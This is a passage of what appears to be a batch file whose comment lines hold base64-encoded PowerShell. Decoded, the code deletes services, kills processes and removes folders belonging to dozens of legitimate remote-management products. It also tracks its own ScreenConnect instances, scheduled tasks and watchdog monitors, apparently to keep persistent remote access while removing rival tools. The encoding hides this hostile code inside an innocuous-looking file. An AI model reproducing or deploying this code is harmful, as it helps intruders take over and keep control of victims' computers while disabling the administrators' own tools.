::R2V0U2NyZWVuKicpOyBQcm9jPUAoJ0dldFNjcmVlbionKTsgRGlycz1AKCIkZW52
::OlByb2dyYW1GaWxlc1xHZXRTY3JlZW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cR2V0U2NyZWVuIik7IFByb2Q9QCgnR2V0U2NyZWVuKicpIH0NCiAgICAgICAg
::QHsgVGFnPSdJcGVyaXVzJzsgICAgICBTdmM9QCgnSXBlcml1cyonKTsgUHJvYz1A
::KCdJcGVyaXVzUmVtb3RlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElw
::ZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElwZXJpdXMg
::UmVtb3RlIik7IFByb2Q9QCgnSXBlcml1cyonKSB9DQogICAgICAgIEB7IFRhZz0n
::SVNMT25saW5lJzsgICBTdmM9QCgnSVNMbGlnaHQqJyk7IFByb2M9QCgnSVNMbGln
::aHQqJywnSVNMQWx3YXlzT24qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
::SVNMIE9ubGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJU0wgT25saW5l
::Iik7IFByb2Q9QCgnSVNMIExpZ2h0KicsJ0lTTCBBbHdheXNPbionKSB9DQogICAg
::ICAgIEB7IFRhZz0nQW1teXknOyAgICAgICAgU3ZjPUAoJ0FtbXl5KicpOyBQcm9j
::PUAoJ0FtbXl5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFtbXl5Iiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFtbXl5Iik7IFByb2Q9QCgnQW1teXkq
::JykgfQ0KICAgICAgICBAeyBUYWc9J1VsdHJhVmlld2VyJzsgIFN2Yz1AKCdVbHRy
::YVZpZXdlcionKTsgUHJvYz1AKCdVbHRyYVZpZXdlcionKTsgRGlycz1AKCIkZW52
::OlByb2dyYW1GaWxlc1xVbHRyYVZpZXdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
::ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAoJ1VsdHJhVmlld2VyKicpIH0NCiAg
::ICAgICAgQHsgVGFnPSdBZXJvQWRtaW4nOyAgICBTdmM9QCgnQWVyb0FkbWluKicp
::OyBQcm9jPUAoJ0Flcm9BZG1pbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
::c1xBZXJvQWRtaW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWVyb0FkbWlu
::Iik7IFByb2Q9QCgnQWVyb0FkbWluKicpIH0NCiAgICAgICAgQHsgVGFnPSdMaXRl
::TWFuYWdlcic7ICBTdmM9QCgnTGl0ZU1hbmFnZXIqJyk7IFByb2M9QCgnUk9NU2Vy
::dmVyKicsJ1JPTVZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xM
::aXRlTWFuYWdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMaXRlTWFuYWdl
::ciIpOyBQcm9kPUAoJ0xpdGVNYW5hZ2VyKicpIH0NCiAgICAgICAgQHsgVGFnPSdS
::YWRtaW4nOyAgICAgICBTdmM9QCgnUmFkbWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIz
::KicsJ1JhZG1pbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSYWRtaW4g
::U2VydmVyIDMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmFkbWluIFNlcnZl
::ciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0NCiAgICAgICAgQHsgVGFnPSdOb01h
::Y2hpbmUnOyAgICBTdmM9QCgnbnhzZXJ2ZXIqJywnbnhkKicpOyBQcm9jPUAoJ254
::ZConLCdueHNlcnZlcionLCdueHJ1bm5lcionKTsgRGlycz1AKCIkZW52OlByb2dy
::YW1GaWxlc1xOb01hY2hpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTm9N
::YWNoaW5lIik7IFByb2Q9QCgnTm9NYWNoaW5lKicpIH0NCiAgICAgICAgQHsgVGFn
::PSdOaW5qYU9uZSc7ICAgICBTdmM9QCgnTmluamFSTU1BZ2VudCcsJ25pbmphcm1t
::KicsJ05pbmphUk1NKicpOyBQcm9jPUAoJ05pbmphUk1NQWdlbnQqJywnbmluamFy
::bW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmluamFSTU1BZ2VudCIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYVJNTUFnZW50IiwiJGVudjpQ
::cm9ncmFtRGF0YVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTmlu
::amFPbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFPbmUiKTsgUHJv
::ZD1AKCdOaW5qYVJNTSonLCdOaW5qYU9uZSonKSB9DQogICAgICAgIEB7IFRhZz0n
::QXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVy
::YUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFURVJBIE5ldHdv
::cmtzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIiwi
::JGVudjpQcm9ncmFtRGF0YVxBVEVSQSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJh
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdDb25uZWN0V2lzZSc7ICBTdmM9QCgnTFRT
::ZXJ2aWNlJywnTFRTdmNNb24nKTsgUHJvYz1AKCdMVFN2YyonLCdMVFRyYXkqJyk7
::IERpcnM9QCgiJGVudjp3aW5kaXJcTFRTdmMiLCIkZW52OlByb2dyYW1GaWxlc1xM
::YWJUZWNoIENsaWVudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMYWJUZWNo
::IENsaWVudCIpOyBQcm9kPUAoJ0Nvbm5lY3RXaXNlIEF1dG9tYXRlKicsJ0Nvbm5l
::Y3RXaXNlIFJNTSonLCdMYWJUZWNoKicpIH0NCiAgICAgICAgQHsgVGFnPSdLYXNl
::eWEnOyAgICAgICBTdmM9QCgnQWdlbnRNb24nLCdLYXNleWEqJywnS0FBRFMqJyk7
::IFByb2M9QCgnQWdlbnRNb24qJywnS2FzZXlhKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXEthc2V5YSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxLYXNl
::eWEiKTsgUHJvZD1AKCdLYXNleWEgVlNBKicsJ0thc2V5YSBBZ2VudConKSB9DQog
::ICAgICAgIEB7IFRhZz0nTmFibGUnOyAgICAgICAgU3ZjPUAoJ0FkdmFuY2VkIE1v
::bml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAo
::J0ZpbGVTeXN0ZW1BZ2VudConLCdOQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50IiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIkZW52
::OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5vbG9naWVzIiwiJHtlbnY6UHJvZ3Jh
::bUZpbGVzKHg4Nil9XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIkZW52OlByb2dyYW1G
::aWxlc1xNU1BBIEZpbGVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1TUEEg
::RmlsZXMiKTsgUHJvZD1AKCdBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04t
::YWJsZSonLCdOLWNlbnRyYWwqJywnTi1zaWdodConLCdUYWtlIENvbnRyb2wqJywn
::U29sYXJXaW5kcyBNU1AqJykgfQ0KICAgICAgICBAeyBUYWc9J1N5bmNybyc7ICAg
::ICAgIFN2Yz1AKCdTeW5jcm8qJywnS2FidXRvKicpOyBQcm9jPUAoJ1N5bmNybyon
::LCdLYWJ1dG8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVwYWlyVGVj
::aCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZXBhaXJUZWNoIiwiJGVudjpQ
::cm9ncmFtRmlsZXNcU3luY3JvIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN5
::bmNybyIsIiRlbnY6UHJvZ3JhbURhdGFcU3luY3JvIik7IFByb2Q9QCgnU3luY3Jv
::KicsJ0thYnV0byonLCdSZXBhaXJUZWNoKicpIH0NCiAgICAgICAgQHsgVGFnPSdQ
::dWxzZXdheSc7ICAgICBTdmM9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRvcionKTsg
::UHJvYz1AKCdQQ01vbml0b3JNZ3IqJywnUENNb25pdG9yTWFuYWdlcionLCdQdWxz
::ZXdheSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQdWxzZXdheSIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQdWxzZXdheSIsIiRlbnY6UHJvZ3JhbUZp
::bGVzXFBDIE1vbml0b3IiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUEMgTW9u
::aXRvciIpOyBQcm9kPUAoJ1B1bHNld2F5KicsJ1BDIE1vbml0b3IqJykgfQ0KICAg
::ICAgICBAeyBUYWc9J1N1cGVyT3BzJzsgICAgIFN2Yz1AKCdTdXBlck9wcyonKTsg
::UHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xT
::dXBlck9wcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXBlck9wcyIsIiRl
::bnY6UHJvZ3JhbURhdGFcU3VwZXJPcHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9
::DQogICAgICAgIEB7IFRhZz0nTGV2ZWwnOyAgICAgICAgU3ZjPUAoJ0xldmVsKicp
::OyBQcm9jPUAoJ2xldmVsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExl
::dmVsIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExldmVsIiwiJGVudjpQcm9n
::cmFtRGF0YVxMZXZlbCIpOyBQcm9kPUAoJ0xldmVsKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdBY3Rpb24xJzsgICAgICBTdmM9QCgnQWN0aW9uMSonKTsgUHJvYz1AKCdB
::Y3Rpb24xKicsJ2FjdGlvbjFfYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFt
::RmlsZXNcQWN0aW9uMSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3Rpb24x
::IiwiJGVudjpQcm9ncmFtRGF0YVxBY3Rpb24xIik7IFByb2Q9QCgnQWN0aW9uMSon
::KSB9DQogICAgICAgIEB7IFRhZz0nTWFuYWdlRW5naW5lJzsgU3ZjPUAoJ01hbmFn
::ZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQqJyk7IFByb2M9QCgnTWFuYWdlRW5n
::aW5lKicsJ2RjYWdlbnQqJywnVUVNUyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xNYW5hZ2VFbmdpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWFu
::YWdlRW5naW5lIik7IFByb2Q9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVz
::a3RvcCBDZW50cmFsKicsJ0VuZHBvaW50IENlbnRyYWwqJywnUk1NIENlbnRyYWwq
::JykgfQ0KICAgICAgICBAeyBUYWc9J1RhY3RpY2FsUk1NJzsgIFN2Yz1AKCd0YWN0
::aWNhbHJtbSonLCdNZXNoIEFnZW50JywnTWVzaEFnZW50Jyk7IFByb2M9QCgndGFj
::dGljYWxybW0qJywnbWVzaGFnZW50KicsJ01lc2hBZ2VudConKTsgRGlycz1AKCIk
::ZW52OlByb2dyYW1GaWxlc1xUYWN0aWNhbEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZp
::bGVzKHg4Nil9XFRhY3RpY2FsQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xNZXNo
::IEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsg
::UHJvZD1AKCdUYWN0aWNhbConLCdNZXNoIEFnZW50KicsJ01lc2hDZW50cmFsKicp
::IH0NCiAgICAgICAgQHsgVGFnPSdNZXNoQ2VudHJhbCc7ICBTdmM9QCgnTWVzaCBB
::Z2VudCcsJ01lc2hBZ2VudCcsJ01lc2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hB
::Z2VudConLCdNZXNoQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
::c1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdl
::bnQiKTsgUHJvZD1AKCdNZXNoKkFnZW50KicsJ01lc2hDZW50cmFsKicpIH0NCiAg
::ICAgICAgQHsgVGFnPSdDb250aW51dW0nOyAgICBTdmM9QCgnU0FBWionLCdDb250
::aW51dW0qJyk7IFByb2M9QCgnU0FBWionLCdDb250aW51dW0qJyk7IERpcnM9QCgi
::JGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XFNBQVpPRCIsIiRlbnY6UHJvZ3JhbUZpbGVzXENvbnRpbnV1bSIsIiR7ZW52
::OlByb2dyYW1GaWxlcyh4ODYpfVxDb250aW51dW0iKTsgUHJvZD1AKCdDb250aW51
::dW0qJywnU0FBWionKSB9DQogICAgICAgIEB7IFRhZz0nTmF2ZXJpc2snOyAgICAg
::U3ZjPUAoJ05hdmVyaXNrKicpOyBQcm9jPUAoJ05hdmVyaXNrKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXE5hdmVyaXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9XE5hdmVyaXNrIik7IFByb2Q9QCgnTmF2ZXJpc2sqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J0ltbXlCb3QnOyAgICAgIFN2Yz1AKCdJbW15Qm90KicsJ0ltbXkq
::Jyk7IFByb2M9QCgnSW1teUFnZW50KicsJ0ltbXlCb3QqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcSW1teUJvdCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxJbW15Qm90IiwiJGVudjpQcm9ncmFtRGF0YVxJbW15Qm90Iik7IFByb2Q9QCgn
::SW1teUJvdConKSB9DQogICAgICAgIEB7IFRhZz0nQXV0b21veCc7ICAgICAgU3Zj
::PUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsgUHJvYz1AKCdhbWFnZW50KicpOyBE
::aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dG9tb3giLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cQXV0b21veCIsIiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2VudCIp
::OyBQcm9kPUAoJ0F1dG9tb3gqJykgfQ0KICAgICAgICBAeyBUYWc9J0Fjcm9uaXND
::eWJlcic7IFN2Yz1AKCdBY3JvbmlzKicpOyBQcm9jPUAoJ2Fjcm9jbWQqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWNyb25pcyIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxBY3JvbmlzIik7IFByb2Q9QCgnQWNyb25pcyBDeWJlcionLCdB
::Y3JvbmlzIEFnZW50KicsJ0N5YmVyIFByb3RlY3QgQWdlbnQqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J0RvbW90eic7ICAgICAgIFN2Yz1AKCdEb21vdHoqJyk7IFByb2M9
::QCgnRG9tb3R6KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERvbW90eiIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxEb21vdHoiKTsgUHJvZD1AKCdEb21v
::dHoqJykgfQ0KICAgICAgICBAeyBUYWc9J0F1dmlrJzsgICAgICAgIFN2Yz1AKCdB
::dXZpayonKTsgUHJvYz1AKCdBdXZpayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBdXZpayIpOyBQ
::cm9kPUAoJ0F1dmlrKicpIH0NCiAgICAgICAgQHsgVGFnPSdCYXJyYWN1ZGFSTU0n
::OyBTdmM9QCgnQmFycmFjdWRhKicpOyBQcm9jPUAoJ01XU2VydmljZSonKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xCYXJyYWN1ZGEiLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cQmFycmFjdWRhIiwiJGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwg
::UGxhdGZvcm1zIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExldmVsIFBsYXRm
::b3JtcyIpOyBQcm9kPUAoJ0JhcnJhY3VkYSBSTU0qJywnTWFuYWdlZCBXb3JrcGxh
::Y2UqJykgfQ0KICAgICAgICBAeyBUYWc9J0dvdmVybGFuJzsgICAgIFN2Yz1AKCdH
::b3ZlcmxhbionKTsgUHJvYz1AKCdnb3ZlcmxhbionLCdnb3ZhZ2VudConKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb3ZlcmxhbiIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxHb3ZlcmxhbiIpOyBQcm9kPUAoJ0dvdmVybGFuKicpIH0NCiAg
::ICAgICAgQHsgVGFnPSdQRFEnOyAgICAgICAgICBTdmM9QCgnUERRKicpOyBQcm9j
::PUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRvcnkqJywnUERRRGVwbG95KicpOyBE
::aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFkbWluIEFyc2VuYWwiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cQWRtaW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZp
::bGVzXFBEUSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1A
::KCdQRFEgRGVwbG95KicsJ1BEUSBJbnZlbnRvcnkqJywnUERRIENvbm5lY3QqJykg
::fQ0KICAgICkNCg0KICAgIGZvcmVhY2ggKCR0b29sIGluICRybW0pIHsNCiAgICAg
::ICAgJGhpdCA9ICRmYWxzZQ0KICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29s
::LlByb2QpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6
::VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAgICAgICAgICBHZXQtQ2hpbGRJdGVt
::ICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1P
::YmplY3Qgew0KICAgICAgICAgICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9w
::ZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRp
::c3BsYXlOYW1lDQogICAgICAgICAgICAgICAgICAgIGlmICgkZG4gLWFuZCAkZG4g
::LWxpa2UgJHBhdCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKElzLURh
::dHRvS2VlcGVyICRkbikgeyBMb2cgInJtbV9za2lwX2RhdHRvX2tlZXAgWyRkbl0i
::OyByZXR1cm4gfQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFVuaW5zdGFs
::bC1Qcm9kdWN0S2V5ICRfKSB7ICRuLnJtbSsrOyAkaGl0ID0gJHRydWUgfQ0KICAg
::ICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAg
::ICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wu
::U3ZjKSB7DQogICAgICAgICAgICBHZXQtU2VydmljZSAtTmFtZSAkcGF0IC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAkXy5OYW1lIC1vciBJcy1E
::YXR0b0tlZXBlciAkXy5EaXNwbGF5TmFtZSkgeyBMb2cgInJtbV9za2lwX2RhdHRv
::X3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0NCiAgICAgICAgICAgICAgICAmIHNj
::LmV4ZSBzdG9wICIkKCRfLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAg
::ICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUwMA0KICAgICAgICAg
::ICAgICAgICYgc2MuZXhlIGRlbGV0ZSAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9n
::ICJybW1fc3ZjX2RlbGV0ZWQgJCgkXy5OYW1lKSBbJCgkdG9vbC5UYWcpXSINCiAg
::ICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkcGF0IGlu
::ICR0b29sLlByb2MpIHsNCiAgICAgICAgICAgIEdldC1Qcm9jZXNzIC1OYW1lICRw
::YXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
::dCB7DQogICAgICAgICAgICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAkXy5JZCAtRm9y
::Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgICAg
::ICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9wcm9jX2tpbGxlZCAk
::KCRfLlByb2Nlc3NOYW1lKSBbJCgkdG9vbC5UYWcpXSINCiAgICAgICAgICAgIH0N
::CiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkZCBpbiAkdG9vbC5EaXJzKSB7
::DQogICAgICAgICAgICBpZiAoJGQgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
::aCAkZCkpIHsNCiAgICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGQp
::IHsgTG9nICJybW1fc2tpcF9kYXR0b19kaXIgJGQiOyBjb250aW51ZSB9DQogICAg
::ICAgICAgICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5ybW0rKzsg
::JGhpdCA9ICR0cnVlOyBMb2cgInJtbV9kaXJfcmVtb3ZlZCAkZCIgfQ0KICAgICAg
::ICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAicm1tX2Rpcl9SRU1PVkVf
::RkFJTEVEICRkIiB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAg
::aWYgKCRoaXQpIHsgTG9nICJybW1fZXh0ZXJtaW5hdGVkICQoJHRvb2wuVGFnKSIg
::fQ0KICAgIH0NCg0KICAgICRzdW1tYXJ5ID0gImV4dGVybWluYXRlIHN2Yz0kKCRu
::LnN2YykgcHJvYz0kKCRuLnByb2MpIGRpcj0kKCRuLmRpcikgcHJvZHVjdD0kKCRu
::LnByb2R1Y3QpIHJtbT0kKCRuLnJtbSkgZmFpbD0kKCRuLmZhaWwpIg0KICAgIExv
::ZyAkc3VtbWFyeQ0KICAgIHJldHVybiAkc3VtbWFyeQ0KfQ0KDQpmdW5jdGlvbiBV
::cGRhdGUtU3RhdGUgew0KICAgICRrZWVwID0gQChHZXQtS2VlcEZpbmdlcnByaW50
::cykNCiAgICAkZ3J5eGFGcCA9IEdldC1Hcnl4YUZwDQogICAgJHNldnJ6ID0gQChH
::ZXQtU2V2cnpLZWVwKQ0KICAgICRwcmltRnAgPSAkc2V2cnpbMF07ICRhbHRGcCA9
::ICRzZXZyelsxXQ0KICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVsbDsgJHNj
::cmlwdDpncnl4YSA9ICRudWxsDQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNl
::cnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7DQogICAgICAg
::IGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7DQog
::ICAgICAgICAgICAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAg
::ICAgIGlmICgkZnAgLWVxICRwcmltRnApIHsgJHByaW0gPSAiJCgkc3ZjLlN0YXR1
::cykiIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJGZwIC1lcSAkYWx0RnApIHsgJGFs
::dCA9ICIkKCRzdmMuU3RhdHVzKSIgfQ0KICAgICAgICAgICAgZWxzZWlmICgkZnAg
::LWVxICRncnl4YUZwIC1vciAoVGVzdC1Jc0dyeXhhRnAgJGZwKSkgeyAkc2NyaXB0
::OmdyeXhhID0gIiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAgIH0NCiAgICB9DQog
::ICAgJGZvcmVpZ24gPSBAKCkNCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2Vy
::dmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsNCiAgICAgICAg
::aWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScgLWFuZCAk
::bWF0Y2hlc1sxXSAtbm90aW4gJGtlZXApIHsNCiAgICAgICAgICAgICRmb3JlaWdu
::ICs9ICRtYXRjaGVzWzFdDQogICAgICAgIH0NCiAgICB9DQogICAgJGlkID0gUmVh
::ZC1JZGVudGl0eQ0KICAgICR0YXNrc09rID0gMDsgJHRhc2tzVG90YWwgPSAwDQog
::ICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RB
::U0tfRCcpIHsNCiAgICAgICAgJHRhc2tzVG90YWwrKw0KICAgICAgICAkdG4gPSBO
::b3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRrXSkNCiAgICAgICAgaWYg
::KC1ub3QgJHRuKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgJG1hcmtlciA9IGlmICgk
::ayAtZXEgJ1RBU0tfQicpIHsgJ2V0bF9tb24uY21kJyB9IGVsc2UgeyAnb3duX21v
::bi5jbWQnIH0NCiAgICAgICAgaWYgKChUZXN0LVRhc2tPd25zTW9uICR0biAkbWFy
::a2VyKSAtb3IgKFRlc3QtVGFza093bnNNb24gKCJcJHRuIikgJG1hcmtlcikpIHsg
::JHRhc2tzT2srKyB9DQogICAgfQ0KICAgICMgTDM5OiBjb3VudCBXdWNhY2hlR3J5
::eGFCb290IChUQVNLX0cpDQogICAgJHRhc2tzVG90YWwrKw0KICAgICR0Z05hbWUg
::PSAnV3VjYWNoZUdyeXhhQm9vdCcNCiAgICBpZiAoKEdldC1TY2hlZHVsZWRUYXNr
::IC1UYXNrTmFtZSAkdGdOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::KSAtb3INCiAgICAgICAgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0
::aCAkV29ya0RpciAnZ3J5eGFfYm9vdC5jbWQnKSkpIHsNCiAgICAgICAgJHRhc2tz
::T2srKw0KICAgIH0NCiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9
::IEpvaW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnIH0NCiAgICAkd2QgPSBF
::bnN1cmUtV2F0Y2hkb2cNCiAgICAkcHJldiA9IEB7fQ0KICAgICRzdGF0ZVBhdGgg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nDQogICAgaWYgKFRlc3Qt
::UGF0aCAkc3RhdGVQYXRoKSB7DQogICAgICAgIHRyeSB7IChHZXQtQ29udGVudCAt
::TGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbiku
::UFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gtT2JqZWN0IHsgJHByZXZbJF8u
::TmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0Y2gge30NCiAgICB9DQogICAgJGluc3Rh
::bGxDb3VudCA9IDENCiAgICBpZiAoJHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0
::YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxDb3VudCB9DQogICAgaWYgKCRw
::cmV2LnByaW0gLWFuZCAkcHJldi5wcmltIC1uZSAnUnVubmluZycgLWFuZCAkcHJp
::bSAtZXEgJ1J1bm5pbmcnKSB7ICRpbnN0YWxsQ291bnQrKyB9DQogICAgJHN0YXRl
